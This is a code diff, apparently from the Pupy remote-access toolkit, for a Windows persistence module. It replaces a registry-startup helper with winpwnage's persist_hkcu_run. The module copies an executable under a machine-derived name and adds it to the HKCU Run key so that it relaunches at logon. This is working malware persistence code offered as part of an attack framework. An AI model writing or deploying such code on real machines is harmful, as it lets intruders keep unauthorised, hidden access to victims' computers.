@@ -3,7 +3,7 @@
 ''' Execute persistence command '''
 
 __dependencies__ = {
-    'windows': ['pupwinutils.persistence'],
+    'windows': ['winpwnage.core', 'winpwnage.functions.persist'],
 }
 
 __arguments__ = {
@@ -23,7 +23,8 @@ from tempfile import gettempdir
 from uuid import getnode
 from hashlib import md5
 
-from pupwinutils.persistence import add_registry_startup
+from winpwnage.functions.persist import persist_hkcu_run
+
 
 def main(src=None, directory=None, filename=None, args=None, regkey=None, logger=None, pupy=None):
     if not directory:
@@ -33,10 +34,10 @@ def main(src=None, directory=None, filename=None, args=None, regkey=None, logger
         directory = path.expandvars(directory)
 
     mid = md5('node={} cid={}'.format(
-            getnode(), pupy.cid)).hexdigest()
+        getnode(), pupy.cid)).hexdigest()
 
     if not filename:
-        filename = mid[:8]+'.exe'
+        filename = mid[:8] + '.exe'
 
     if not src:
         src = sys.executable
@@ -59,5 +60,5 @@ def main(src=None, directory=None, filename=None, args=None, regkey=None, logger
         logger.debug('Copy: {} -> {}'.format(src, filepath))
         copy(src, filepath)
 
-    if not add_registry_startup(cmd, regkey):
-        logger.error('add_registry_startup failed')
+    if not persist_hkcu_run(cmd, regkey):
+        logger.error('persist hkcu run failed')
